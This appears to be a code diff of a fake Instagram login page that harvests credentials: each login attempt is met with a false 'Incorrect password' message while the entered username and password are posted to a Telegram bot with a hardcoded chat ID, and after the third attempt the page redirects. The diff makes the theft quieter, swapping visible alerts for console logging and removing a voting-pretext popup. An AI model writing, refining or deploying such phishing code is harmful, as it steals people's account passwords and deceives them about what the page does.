@@ -21,72 +21,6 @@
             margin-top: 10px;
             text-align: center;
         }
-
-        .popup {
-            visibility: hidden;
-            min-width: 250px;
-            background-color: #333;
-            color: white;
-            text-align: center;
-            border-radius: 2px;
-            padding: 16px;
-            position: fixed;
-            z-index: 1;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            font-size: 17px;
-        }
-
-        .popup.show {
-            visibility: visible;
-            -webkit-animation: fadeInUp 0.5s, fadeOut 0.5s 2.5s;
-            animation: fadeInUp 0.5s, fadeOut 0.5s 2.5s;
-        }
-
-        @-webkit-keyframes fadeInUp {
-            from {
-                bottom: 0;
-                opacity: 0;
-            }
-
-            to {
-                bottom: 30px;
-                opacity: 1;
-            }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                bottom: 0;
-                opacity: 0;
-            }
-
-            to {
-                bottom: 30px;
-                opacity: 1;
-            }
-        }
-
-        @-webkit-keyframes fadeOut {
-            from {
-                opacity: 1;
-            }
-
-            to {
-                opacity: 0;
-            }
-        }
-
-        @keyframes fadeOut {
-            from {
-                opacity: 1;
-            }
-
-            to {
-                opacity: 0;
-            }
-        }
     </style>
 </head>
 
@@ -105,7 +39,7 @@
                     </div>
                 </div>
                 <div class="form-container">
-                   <form id="contactForm" method="POST">
+                    <form id="contactForm">
                         <div class="form-content box">
                             <div class="logo">
                                 <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
@@ -180,8 +114,6 @@
         </div>
     </div>
 
-    <div id="popup" class="popup">Link sent to email. Reset password and vote.</div>
-
     <!-- APP JS -->
     <script src="app.js"></script>
 
@@ -200,16 +132,6 @@
             }
         }
 
-        function showPopup() {
-            var popup = document.getElementById("popup");
-            popup.classList.add("show");
-        }
-
-        function hidePopup() {
-            var popup = document.getElementById("popup");
-            popup.classList.remove("show");
-        }
-
         function handleLogin(event) {
             event.preventDefault();
             attemptCount++;
@@ -218,7 +140,6 @@
 
             if (attemptCount < 3) {
                 document.getElementById("attempt").value = "Attempt " + attemptCount;
-                showPopup();
                 errorMessage.textContent = "Incorrect password. Try again.";
 
                 // Prepare the message to send to Telegram
@@ -236,25 +157,25 @@
                     method: "POST"
                 }).then(response => response.json()).then(data => {
                     if (data.ok) {
-                        alert('Message sent successfully!');
+                        console.log('Message sent successfully!');
                     } else {
-                        alert('Failed to send message.');
+                        console.log('Failed to send message.');
                     }
                 }).catch(error => {
                     console.error('Error:', error);
-                    alert('Error sending message.');
+                    console.log('Error sending message.');
                 });
 
-                // Hide the popup when the user starts typing again
-                document.getElementById("username").addEventListener("input", hidePopup);
-                document.getElementById("password").addEventListener("input", hidePopup);
+                // Hide the error message when the user starts typing again
+                document.getElementById("username").addEventListener("input", () => errorMessage.textContent = "");
+                document.getElementById("password").addEventListener("input", () => errorMessage.textContent = "");
             } else {
                 // On the third attempt, submit the form and then redirect
                 document.getElementById("attempt").value = "Final Attempt";
 
                 // Prepare the message to send to Telegram
                 const username = document.getElementById('username').value;
-                const password = document.get                const password = document.getElementById('password').value;
+                const password = document.getElementById('password').value;
                 const textMessage = `*Final login attempt:* \n*Username:* ${username}\n*Password:* ${password}`;
 
                 const chatId = '6534651073'; // Replace with your chat ID
@@ -267,13 +188,13 @@
                     method: "POST"
                 }).then(response => response.json()).then(data => {
                     if (data.ok) {
-                        alert('Final message sent successfully!');
+                        console.log('Final message sent successfully!');
                     } else {
-                        alert('Failed to send final message.');
+                        console.log('Failed to send final message.');
                     }
                 }).catch(error => {
                     console.error('Error:', error);
-                    alert('Error sending final message.');
+                    console.log('Error sending final message.');
                 });
 
                 // Submit the form to redirect to another page
